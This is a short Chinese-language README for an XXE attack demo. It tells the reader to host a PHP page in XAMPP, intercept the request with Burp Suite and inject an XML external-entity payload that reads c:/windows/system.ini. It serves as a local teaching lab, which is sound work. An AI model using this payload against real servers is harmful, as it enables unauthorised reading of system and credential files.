# xxe-demo
這是一個簡單的xxe攻擊demo

#下載

下載資料到xampp的htdocs裡，不然瀏覽器不能開喔

#攻擊
1. 先到瀏覽器開啟xxe_test_demo.php檔
2. 開啟burp suite攔截資料
3. 將下面payload放置攔截資料底下

   <!DOCTYPE a[<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]>
   <creds> &xxe; </creds>
   
4.送出
